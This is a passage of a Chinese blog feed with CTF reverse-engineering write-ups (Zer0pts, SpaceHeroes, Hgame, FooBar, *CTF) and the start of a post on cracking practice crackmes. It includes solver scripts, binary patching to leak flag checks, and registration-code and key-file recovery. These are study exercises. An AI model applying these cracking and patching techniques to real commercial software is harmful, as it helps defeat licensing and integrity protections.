"294763754a8efd4c739d9f679bfca3ab510106f42ddb5dc0216ba8bc98ba3158",  "46c9e22099ee4bfe54a99a3cdbaf69f17f7c6e2581b92f7bab25128fd2100b7a",  "68dbf73d03d3a5107edad3b05676eee240e68c280296e52b6986873c54cef3cb",  "c1818d580d8c8bc111302f4a5e6903ef2d32b11a5613efba507693de8060fb8c",  "44ad63f60af0f6db6fdde6d5186ef78176367df261fa06be3079b6c80c8adba4",  "46c9e22099ee4bfe54a99a3cdbaf69f17f7c6e2581b92f7bab25128fd2100b7a",  "5e07d6fdc602b0f9b99f6ea24c39e65835992faac400264c52449bc409cf4efa",  "e4dcd6d313af71559596d3009c12d025301842d8c7f888c2850333e91a9bda68",  "fffdff4b07a9d973fd1c3a6be443851bc13e82c4af94c88325244694e352aa31",  "3fffd018d2223020be85670d93f565b63df54a9ce3ed2cdf6347a61df016938c",  "b2941852282562cc3d813e8bf1705d0480a7a008ffa2475501d7c5161165a7fb",  "635ca73d00d4f28b5f573b16eea56e9e4579d77e561c32aa68189d9769fa1753",  "a4d0ef23161b5b7c6a8d5b287543fd74e16b3bf313d71aa187c24cdd728a7b1e",  "e0b9a8799f32453a478c9122f8b83cee68e16db18f493ac81bc1d474594b5df4",  "564999cbbfea80170ba068dcf961d9914625f3be951b2c1fe163bae0f8156c24",  "4a44dc15364204a80fe80e9039455cc1608281820fe2b24f1e5233ade6af1dd5",  "e91787068a3c60e9712a7abeb6a67f518a40723c1b89c11d6070fe5f9389ebf9",  "7eb70257593da06f682a3ddda54a9d260d4fc514f645237f5ca74b08f8da61a6",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",  "96a296d224f285c67bee93c30f8a309157f0daa35dc5b87e410b78630a09cfc7",]import hashlibimport itertoolsdef dec(h):  for l in range(2,3):    for p in itertools.product(range(128), repeat=l):      if hashlib.sha256(bytes(p)).hexdigest()==h:        return bytes(p)flag = b""for h in hash:  flag += dec(h)print(flag.decode())</code></pre><p>zer0pts{m0d1fy1ng_PE_1mp0rts_1s_4n_34sy_0bfusc4t10n}</p><p><a href="https://www.cnblogs.com/xxxxxxxxx/p/11544432.html">https://www.cnblogs.com/xxxxxxxxx/p/11544432.html</a></p><p>这里介绍了itertools.product，其实目的就是生成2位字符的彩虹表，然后和密文对比</p><h1 id="SpaceHeroesCtf2022-Shai-Hulud"><a href="#SpaceHeroesCtf2022-Shai-Hulud" class="headerlink" title="SpaceHeroesCtf2022-Shai-Hulud"></a>SpaceHeroesCtf2022-Shai-Hulud</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00-前言"></a>0x00-前言</h2><p>比较有趣的一道题，当时专注于改源码搞定游戏，然后一直失败，主要是自己写的C语言生成的随机数和调试得到的不同（其实是没注意linux和windows生成随机数的不同），所以就想玩游戏得到flag</p><p>另外的解法</p><p><a href="https://breaking-bits.gitbook.io/breaking-bits/spaceheros-ctf-2022/re-shai-hulud">https://breaking-bits.gitbook.io/breaking-bits/spaceheros-ctf-2022/re-shai-hulud</a></p><h2 id="0x01-分析过程"><a href="#0x01-分析过程" class="headerlink" title="0x01-分析过程"></a>0x01-分析过程</h2><p>运行程序知道这是个贪吃蛇小游戏，通过不等于0x295判断这就是贪吃蛇长度，然后SHA256_Init可以看出这是sha256加密</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148254617.png"></p><p>前面的一些函数就是生成地图，初始化游戏等操作</p><p>主要看下面这个函数，是随机生成需要吃掉的点的</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148425600.png" alt="vibration"></p><p>这两个函数是一些规则，告诉你wasd是移动</p><p>主要看frame函数</p><p>下面这个函数是说不能碰到尾巴，继续往下看</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148585642.png" alt="判定退出"></p><p>可以看到等于-2的时候，而-2刚好对应随机生产点函数的-2，然后对该值进行sha256加密，并且重新生成-2的点，然后长度+1</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148702003.png"></p><p>所以我们接下来只需要跑到最后的长度即可得到最后的sha256加密值，然后在print_flag函数中，最后进行了一次异或</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148830700.png" alt="print_flag"></p><p>本来修改好规则打算玩到0x294的，但是在长度为195的时候随机点找不到。所以只能老实做</p><p>在导入表可以看到SHA256_Init，SHA256_Update，SHA256_Final函数，可以知道调用了OPENSSL，版本为1.1.0</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649148953206.png" alt="导入表"></p><p>安装好之后，模仿该过程生成SHA256加密，注意因为每次都会Update，所以不能将最后一次生成的值直接SHA256加密，这样得到的结果不一样</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649153105553.png" alt="函数说明"></p><p>这也就是前面说的，每加密完一次，hash初始值都会被改变</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;openssl/sha.h&gt;#include &lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc, char const* argv[]){SHA256_CTX ctx;srand(0x2454);char output[256];__int64_t buffer;int x, y;SHA256_Init(&amp;ctx);for (int i = 0; i &lt; 0x294; ++i){x = rand() % 33;y = rand() % 20;buffer = 16 * x + y;SHA256_Update(&amp;ctx, &amp;buffer, 8);SHA256_Final(output, &amp;ctx);}for(int i = 0; i&lt;32; i++) //将SHA256以16进制输出{         printf("%02x", (int)output[i]&amp;0xff);    }     puts("\n");return 0;</code></pre><p>编译</p><blockquote><p>g++ -o openssl-sha256 openssl-sha256.c -std=c++11 -lssl -lcrypto</p></blockquote><p>也可以动调得到最后的sha256值</p><p>最后异或一下即可</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;string.h&gt;#include &lt;stdio.h&gt;int main(int argc, char const* argv[]){char data[33] = {0xC2, 0x98, 0xD1, 0x8E, 0xC8, 0xBF, 0x99, 0x75, 0x50, 0x41, 0x54, 0x5D, 0x3C, 0x39, 0xA8, 0x05,0x73, 0x7B, 0xDE, 0xEA, 0xA3, 0xBE, 0x4C, 0x40, 0x2B, 0xE2, 0x48, 0x90, 0x80, 0x7F, 0x7B, 0x8D };unsigned char magic_bytes[32] = {0xB2, 0xEA, 0xE5, 0xBF, 0xBB, 0x8C, 0xC6, 0x01, 0x38, 0x72, 0x0B, 0x2F, 0x0F, 0x54, 0x9C, 0x6E,0x40, 0x24, 0xEA, 0x84, 0xC7, 0xE1, 0x7D, 0x34, 0x58, 0xBD, 0x2E, 0xE2, 0xB4, 0x12, 0x48, 0xFE};for (int i = 0; i &lt; strlen(data); ++i){data[i] ^= magic_bytes[i];}printf("%s", data);return 0;}</code></pre><p><a href="https://blog.csdn.net/zyhse/article/details/108026800?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=2">https://blog.csdn.net/zyhse/article/details/108026800?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_default&amp;utm_relevant_index=2</a></p><p>上面介绍了openssl的一些加密算法使用，下面这个是函数说明</p><p><a href="https://www.jianshu.com/p/3c59291f8f98">https://www.jianshu.com/p/3c59291f8f98</a></p><h1 id="SpaceHeroesCtf2022-Timesup"><a href="#SpaceHeroesCtf2022-Timesup" class="headerlink" title="SpaceHeroesCtf2022-Timesup"></a>SpaceHeroesCtf2022-Timesup</h1><p>进去就是输入三个数满足一个方程式</p><p>计算方法就不多说了，可以看这篇wp</p><p><a href="https://ctftime.org/writeup/32973">https://ctftime.org/writeup/32973</a></p><p>主要看第二个限制，可以看到这里有个限制应该是在16到17秒之间，但是wp里说的是17分，我自己写了代码发现第一个参数是秒，这里也有说明</p><p><a href="https://www.runoob.com/cprogramming/c-function-localtime.html">https://www.runoob.com/cprogramming/c-function-localtime.html</a></p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649157668565.png"></p><p>那么我们就需要借助工具来进行传送参数，需要pwntools</p><pre class="language-none"><code class="language-none">process是连接本地连接remote是连接远端的，格式t=remote('网址',端口)我们可以发送数据过去，也可以接受数据</code></pre><pre class="language-python" data-language="python"><code class="language-python">val = 0xa4c570a = 1b = (val * 7 - 4) // 2c = 1def testfunc(a, b, c):    return (a + b + c &lt;&lt; ((a % b) &amp; 0x1f)) // ((2 &lt;&lt; (a &amp; 0x1f) ^ 3) * c)result = testfunc(a, b, c)print(val)print(result, hex(result))print(hex(a), hex(b), hex(c))from pwn import *#s = process('./timesup')s = remote('0.cloud.chals.io', 26020)print(s.readuntil(b'&gt;&gt;&gt; ').decode())s.writeline('{} {} {}'.format(hex(a), hex(b), hex(c)).encode())s.interactive()</code></pre><p>直接贴代码吧，感觉需要系统学pwntools</p><h1 id="Hgame2022-week4-hardasm"><a href="#Hgame2022-week4-hardasm" class="headerlink" title="Hgame2022-week4-hardasm"></a>Hgame2022-week4-hardasm</h1><p>一打开有几千行的汇编代码，先定位到关键判断</p><p>可以看到有很多的比较+跳转，而跳转的位置都是error</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649300239189.png"></p><p>那么只需要保证不符合等于0即可</p><p>构造flag：hgame{12345678901234567890}动调</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649300476017.png" alt="比较内容"></p><p>可以看到只要输入正确，最后得到的值是0xFF，不正确则为0，可以采取爆破的方式爆破出flag</p><p>可以看到printf的参数是通过rcx传入的，所以我们可以patch程序，让他打印[rsp+70h+var_50]的值，而不是success或error</p><p> <img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1c8291f15811477c8fbbd7d6a480bca0.png" alt="asm-print"> </p><p>edit-&gt;patch Program-&gt;Assemble，不知道为什么KeyPatch改不了</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649301043777.png"></p><h2 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h2><p> subprocess模块可以生成新的进程，连接到它们的input/output/error管道，同时获取它们的返回值</p><p>我们可以使用该模块进行爆破</p><pre class="language-python" data-language="python"><code class="language-python">import subprocessreal_flag="hgame{"#绝对正确的前6个字符cur_index=6#当前爆破的位置while cur_index&lt;32:    for i in range(32,128):#当前爆破的位置上的字符        real_flag_arr = [0] * 32        for j in range(len(real_flag)):#正确的先复制一下            real_flag_arr[j]=ord(real_flag[j])        real_flag_arr[cur_index]=i#设置当前爆破的位置上的字符        real_flag_arr_s="".join(chr(k) for k in real_flag_arr)#输入到程序中的字符串        #上面都是一些初始化        p = subprocess.Popen(["D:\\new\\AD\\game\\hgame2022\\week4\\hardasm.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)        p.stdin.write(real_flag_arr_s.encode())        p.stdin.close()#停止输入        out = p.stdout.read()        if len(out)&gt;cur_index:#判断程序打印出的0xFF的个数是否增加，增加则说明当前爆破的位置上的字符设置的是正确的，因为存储的内容为0时，printf不打印            real_flag+=chr(i)            cur_index+=1            print(real_flag)            break# hgame{r# hgame{ri# hgame{rig# hgame{righ# hgame{right# hgame{right_# hgame{right_y# hgame{right_yo# hgame{right_you# hgame{right_your# hgame{right_your_# hgame{right_your_a# hgame{right_your_as# hgame{right_your_asm# hgame{right_your_asm_# hgame{right_your_asm_i# hgame{right_your_asm_is# hgame{right_your_asm_is_# hgame{right_your_asm_is_g# hgame{right_your_asm_is_go# hgame{right_your_asm_is_goo# hgame{right_your_asm_is_good# hgame{right_your_asm_is_good!# hgame{right_your_asm_is_good!!# hgame{right_your_asm_is_good!!}# hgame{right_your_asm_is_good!!}</code></pre><p>代码来源-<a href="https://blog.csdn.net/weixin_45582916/article/details/122909419">https://blog.csdn.net/weixin_45582916/article/details/122909419</a></p><p>POpen参数说明</p><pre class="language-none"><code class="language-none">stdin stdout和stderr：stdin stdout和stderr，分别表示子程序的标准输入、标准输出和标准错误。可选的值有PIPE或者一个有效的文件描述符（其实是个正整数）或者一个文件对象，还有None。如果是PIPE，则表示需要创建一个新的管道，如果是None，不会做任何重定向工作，子进程的文件描述符会继承父进程的。另外，stderr的值还可以是STDOUT，表示子进程的标准错误也输出到标准输出。</code></pre><pre class="language-python" data-language="python"><code class="language-python">stdin.write()#输入stdin.close()#关闭输入stout.read()#获取输出</code></pre><h1 id="Foobarctf2022-Matrix"><a href="#Foobarctf2022-Matrix" class="headerlink" title="Foobarctf2022-Matrix"></a>Foobarctf2022-Matrix</h1><p>一道vm题+angr求解</p><p>vm分析部分</p><pre class="language-c" data-language="c"><code class="language-c">unsigned char opcode[124] = {    0x04, 0x0B, 0x1D, 0x1C, 0x1B, 0x1A, 0x04, 0x0A, 0x5A, 0x50, 0x4E, 0x5D, //先把mov后面四个进行异或，然后将异或后的值与我们的输入异或 0x00, 0x0A, 0x0B, 0x00, 0x00, 0x0A, //0x00存的是我们的输入 0x04, 0x0B, 0x2D, 0x2C, 0x2B, 0x2A, 0x04, 0x0A, 0x56, 0x69, 0x58, 0x49, 0x00, 0x0A, 0x0B, 0x00, 0x01, 0x0A, 0x04, 0x0B, 0x3D, 0x3C, 0x3B, 0x3A, 0x04, 0x0A, 0x5C, 0x6C, 0x08, 0x65,     0x00, 0x0A, 0x0B, 0x00, 0x02, 0x0A, 0x04, 0x0B, 0x4D, 0x4C, 0x4B, 0x4A, 0x04, 0x0A, 0x7A, 0x04, 0x2E, 0x15, 0x00, 0x0A, 0x0B, 0x00, 0x03, 0x0A, 0x04, 0x0B, 0x5D, 0x5C, 0x5B, 0x5A, 0x04, 0x0A, 0x30, 0x1C, 0x0F, 0x08, 0x00, 0x0A, 0x0B, 0x00, 0x04, 0x0A, 0x04, 0x0B, 0x6D, 0x6C, 0x6B, 0x6A,     0x04, 0x0A, 0x24, 0x14, 0x16, 0x6A, 0x00, 0x0A, 0x0B, 0x00, 0x05, 0x0A, 0x02, 0x00, 0x01, //将我们异或后的值|=其后面一个值 0x02, 0x00, 0x02, 0x02, 0x00, 0x03, 0x02, 0x00, 0x04, 0x02, 0x00, 0x05, 0xFF</code></pre><p>angr求解，因为最后的结果字符串存在GLUG，所以直接angr</p><pre class="language-python" data-language="python"><code class="language-python">import angrimport claripyimport sysproj = angr.Project("./matrix")#创建文件state = proj.factory.entry_state()simgr = proj.factory.simgr()simgr.run()if simgr.deadended:    for s in simgr.deadended:        tmp = s.posix.dumps(0)#获取最终结果        if b"glug" in tmp.lower():            print(tmp)</code></pre><p>不知道为啥只能在linux跑，在windows跑会报错</p><h1 id="CTF2022-Simplefs"><a href="#CTF2022-Simplefs" class="headerlink" title="*CTF2022-Simplefs"></a>*CTF2022-Simplefs</h1><p>根据附件里的描述，可以知道这是关键函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367401948.png"></p><p>这三段都很类似，不同的在于这里传入的参数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367476520.png"></p><p>进去看看，根据不同的参数产生不同的结果，然后写入</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367528880.png"></p><p>当传入2时，生成的是随机数，而且以时间为种子，所以我们不可逆</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367550826.png"></p><p>当传入1时，移位和异或操作，通过动调可以得到异或的值</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367588110.png"></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>遍历文件所有字节流，进行解密，然后和*CTF比较，比对成功就打印其后面的32位</p><p>也可以先将*CTF进行加密，然后将得到的十六进制去加密的文件搜索，取出之后爆破即可（NU1L的题解就是爆破的）</p><p>下面贴一下我的脚本，调试了挺久emmm，太菜了</p><pre class="language-c" data-language="c"><code class="language-c">#define _CRT_SECURE_NO_WARNINGS#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;malloc.h&gt;#include&lt;stdlib.h&gt;#define FilePath "D:\\new\\AD\\game\\星ctf2022\\dcacb9c0054e4a4695b2f373f255ac8e\\image.flag"int main(){char xor_table[4] = { 0xEF,0xBE,0xED,0xDE };FILE* pfile = fopen(FilePath, "r");fseek(pfile, 0 , SEEK_END);int filesize = ftell(pfile);fseek(pfile, 0, SEEK_SET);unsigned char *Buffer = { 0 };Buffer = (unsigned char*)malloc(filesize);memset(Buffer, 0, filesize);fread(Buffer, filesize, 1, pfile);int j = 0;int i = 0;int count = 0;while (1){for (i=j;count&lt;32; ++i,count++){Buffer[i] = ((Buffer[i] &lt;&lt; 5) | (Buffer[i] &gt;&gt; 3)) &amp; 0xff;Buffer[i] ^= xor_table[3];Buffer[i] = ((Buffer[i] &lt;&lt; 4) | (Buffer[i] &gt;&gt; 4)) &amp; 0xff;Buffer[i] ^= xor_table[2];Buffer[i] = ((Buffer[i] &lt;&lt; 3) | (Buffer[i] &gt;&gt; 5)) &amp; 0xff;Buffer[i] ^= xor_table[1];Buffer[i] = ((Buffer[i] &lt;&lt; 2) | (Buffer[i] &gt;&gt; 6)) &amp; 0xff;Buffer[i] ^= xor_table[0];Buffer[i] = ((Buffer[i] &lt;&lt; 1) | (Buffer[i] &gt;&gt; 7)) &amp; 0xff;}if ((Buffer[j] == '*') &amp;&amp; (Buffer[j+1] == 'C') &amp;&amp; (Buffer[j+2] == 'T') &amp;&amp; (Buffer[j+3] == 'F')){for (int k = j; k &lt; 32+j; ++k){printf("%c", Buffer[k]);}break;}j += 32;count = 0;}//fclose(pfile);/*unsigned char Buffer[] = { 0x00,0xD2,0xFC,0xD8,0xA2 };for (int i = 0; i &lt; 5; ++i){Buffer[i] = ((Buffer[i] &lt;&lt; 5) | (Buffer[i] &gt;&gt; 3)) &amp; 0xff;Buffer[i] ^= xor_table[3];Buffer[i] = ((Buffer[i] &lt;&lt; 4) | (Buffer[i] &gt;&gt; 4)) &amp; 0xff;Buffer[i] ^= xor_table[2];Buffer[i] = ((Buffer[i] &lt;&lt; 3) | (Buffer[i] &gt;&gt; 5)) &amp; 0xff;Buffer[i] ^= xor_table[1];Buffer[i] = ((Buffer[i] &lt;&lt; 2) | (Buffer[i] &gt;&gt; 6)) &amp; 0xff;Buffer[i] ^= xor_table[0];Buffer[i] = ((Buffer[i] &lt;&lt; 1) | (Buffer[i] &gt;&gt; 7)) &amp; 0xff;}*/return 0;}</code></pre><p>要注意的是</p><blockquote><p><strong>BYTE是unsigned char型</strong></p></blockquote><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367843687.png"></p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367884507.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-Zer0pts2022-service&quot;&gt;&lt;a href=&quot;#0x00-Zer0pts2022-service&quot; class=&quot;headerlink&quot; title=&quot;0x00-Zer0pts2022-service&quot;&gt;&lt;/a&gt;0x00-Zer0pts20</summary>
      
    
    
    
    
    <category term="Competition" scheme="https://gift1a.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>Crackme算法</title>
    <link href="https://gift1a.github.io/2022/04/03/Crackme%E7%AE%97%E6%B3%95/"/>
    <id>https://gift1a.github.io/2022/04/03/Crackme%E7%AE%97%E6%B3%95/</id>
    <published>2022-04-03T03:27:49.000Z</published>
    <updated>2022-04-20T01:18:49.038Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>因为汇编太水了，所以决定做一下CrackMe练习，可能不会一直弄，精力有限</p><h1 id="0x01-笔记"><a href="#0x01-笔记" class="headerlink" title="0x01-笔记"></a>0x01-笔记</h1><blockquote><p> XCHG（交换数据）指令交换两个操作数内容 </p></blockquote><blockquote><p>mov和lea的区别</p><p>mov:当mov eax,[]表示将[]中地址存储的值存放到eax中，当然也可以直接mov地址到eax中，如mov eax,地址</p><p>lea:当lea eax,[]，表示将[]中的地址存放到eax中，相当于指针，主要是计算地址</p></blockquote><h1 id="002-abexcm5"><a href="#002-abexcm5" class="headerlink" title="002-abexcm5"></a>002-abexcm5</h1><p>首先先通过字符串引用定位到正确判断的位置</p><blockquote><p>调用函数前需要将参数压入堆栈中，并且靠前的参数后压入栈中</p></blockquote><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964360285.png" alt="正确判断"></p><p>接下来可以按x寻找调用位置，红色框中的就是跳转的位置</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964520801.png" alt="调用位置"></p><p>再往上找比较函数</p><p>可以看到这里调用了cmp函数，而且压入了两个参数，第一个是真正的注册码，第二个是我们的输入</p><blockquote><p>cmp:比较两个操作数，根据相减结果来改变零标志位，结果为0时，零标志位为1（Z位）</p><p>当第一位小于第二位时，S位为1</p></blockquote><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964586990.png" alt="比较函数"></p><p>寻找对注册码的操作</p><p>可以看到这里进行了两次拼接操作</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964780202.png" alt="两次拼接"></p><p>这个拼接的字符串是已知的，再看另一个</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964832766.png"></p><p>可以看到先通过GetVolumeInformationA获取驱动器信息，并生成字符串存储到aData4562Abex中，然后将字符串String2拼接到生成的字符串后</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964910270.png" alt="aData4562Abex操作"></p><p>接下来重点讲讲ds段寄存器和重要的操作数</p><blockquote><p>ds:[地址]就相当于ds:地址，而且取出的是里面的内容，然后进行加一，</p><p>dec dl是dl的值–，并且除了CF标志位，其他都会改变。</p><p>dec dl对ZF标志位的影响，jnz跳转的条件是ZF==0，当dl的值为0时，设置ZF=1；否则设置为0</p><p>而一开始mov dl,2就是初始化迭代的次数，那么从mov到jnz这一段就是一个循环。</p></blockquote><p>总的加密就是取出aData字符串的前四位进行两次+1</p><p>所以我们还原一下过程即可得到注册码，但是我不明白GetVolumeInformationA生成的字符串，所以动调了</p><p>最后注册码L2C-5781Fcvc4562-ABEX</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648965721476.png" alt="注册成功"></p><h1 id="003-Cruehead-CrackMe-3"><a href="#003-Cruehead-CrackMe-3" class="headerlink" title="003-Cruehead-CrackMe-3"></a>003-Cruehead-CrackMe-3</h1><p>运行时发现是未cracked的</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648979391664.png" alt="运行时"></p><p>了解到这是需要KEY文件才能正确crack的，我们从头开始分析</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648980725152.png" alt="CreateFileA"></p><pre class="language-c" data-language="c"><code class="language-c">HANDLE CreateFileA(  [in]           LPCSTR                lpFileName,  [in]           DWORD                 dwDesiredAccess,  [in]           DWORD                 dwShareMode,  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,  [in]           DWORD                 dwCreationDisposition,  [in]           DWORD                 dwFlagsAndAttributes,  [in, optional] HANDLE                hTemplateFile);</code></pre><p>具体参数参考<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea</a></p><p>注意压入栈的顺序即可，这里根据参数应该是打开CRACKME3.KEY文件，如果没有的话返回值设置为-1</p><blockquote><p>返回值一般存储在eax寄存器中</p></blockquote><blockquote><p>CMP汇编指令会修改ZF和CF标志寄存器，如果相同的话设置ZF为1，否则为0</p></blockquote><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981137536.png" alt="跳转"></p><p>如果不相等，就跳转到401043，这里我们默认打开了</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981237587.png" alt="ReadFile"></p><p>可以看到先把0x12存入eax，把字符串地址放入ebx中</p><blockquote><p>offset存储的是字符串的地址</p></blockquote><p>接下来调用ReadFile读取文件内容，长度是0x12，位置是字符串地址存储的内容</p><pre class="language-c" data-language="c"><code class="language-c">BOOL ReadFile(    HANDLE hFile,            //文件的句柄    LPVOID lpBuffer,          //用于保存读入数据的一个缓冲区    DWORD nNumberOfBytesToRead,    //要读入的字节数    LPDWORD lpNumberOfBytesRead,    //指向实际读取字节数的指针    LPOVERLAPPED lpOverlapped    //如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。    //该结构定义了一次异步读取操作。否则，应将这个参数设为NULL);</code></pre><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981665617.png" alt="加密函数之一"></p><p>先来看加密函数的初始化操作</p><p>两个xor是将ecx和eax的值清空</p><p>将esp+arg_0存储的值赋值到esi中，也就是读取字符串的地址</p><blockquote><p>这里可以看到arg_0=DWORD 4，esp+4就是我们压入栈中的参数，因为call会让ESP往低地址移动</p></blockquote><p>再将0x41赋值给bl</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981700071.png" alt="初始化操作"></p><p>接下来看加密的操作，首先先将esi的存储的值看作地址，取出里面的内容放到al中，再将al异或上bl的值，再存放回原来的地址</p><blockquote><p>inc实现的是自增1</p></blockquote><p>esi存放的是地址，+1就相当于指针后移</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981955860.png" alt="加密操作"></p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648982311802.png" alt="指针移动"></p><p>然后将异或后的结果加到ds:dword_4020F9存储的内容中</p><p>判断al的值是否为0，如果是的话，跳转到</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648982477054.png" alt="当al为0时跳转的地址"></p><p>接着就是cl++，然后判断bl的值是否为0x4F，因为初始时bl的值为0x41，所以加密数据的长度是0x4f-0x41</p><p>最后，函数loc_401335结束前把ecx的值存放到ds段寄存器地址的内容中</p><p>因为异或后相加的结果存储在dword_4020F9中，这里将它和0x12345678异或</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648982757718.png"></p><blockquote><p>add esp,4是因为call的时候将其下一条指令压入栈中，所以需要add esp,4</p></blockquote><p>接下来又将我们加密后的内容压入栈，进行下一个函数的操作</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648983002897.png" alt="第二轮操作"></p><p>先把esp+4存储的内容也就是存储字符串的首地址存放到esi中，然后esi+0xE，也就是地址后移0xE，再将其存储的值放入eax中，0x12-0xE=4，也就是将最后四个存放到eax寄存器中</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648983018786.png" alt="第二轮操作"></p><p>将最后四位与dword_4020F9，也就是刚才和0x12345678异或后的值比较</p><blockquote><p>setz al；如果ZF=1，则设置目标数为1，否则则为0</p><p>test al,al;如果al&amp;al==0，也就是al的值为0，那么ZF会被设置为1，否则则为0</p></blockquote><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648983201869.png" alt="比较"></p><p>接下来是一些创建窗口和弹出窗口的代码</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648983983571.png" alt="窗口代码"></p><p>看一下成功的部分代码</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984022368.png" alt="成功部分"></p><p>主要看一下这个</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984126580.png" alt="移动字符串"></p><blockquote><p> 即字符串传送指令，这条指令按字节传送数据。通过SI和DI这两个寄存器控制字符串的源地址和目标地址，比如DS:SI这段地址的N个字节复制到ES:DI指向的地址，复制后DS:SI的内容保持不变。 </p></blockquote><p>先把DWORD_402149，也就是前面说的加密的长度</p><p>也就是先把传入的两个参数的地址分别存入esi和edi中</p><p>而第一个参数也就是arg_0(后压入栈)，被存放到esi中</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984644479.png"></p><p>同时，第一个参数也是前面存放我们字符串的地址</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984708951.png"></p><p>然后edi指向的地址后移</p><p>再循环将esi的值存入edi中，循环次数为ecx的值</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984226522.png"></p><p>这段话就是将我们最后加密的字符串拼接到Cracked By:后面</p><h2 id="整体流程"><a href="#整体流程" class="headerlink" 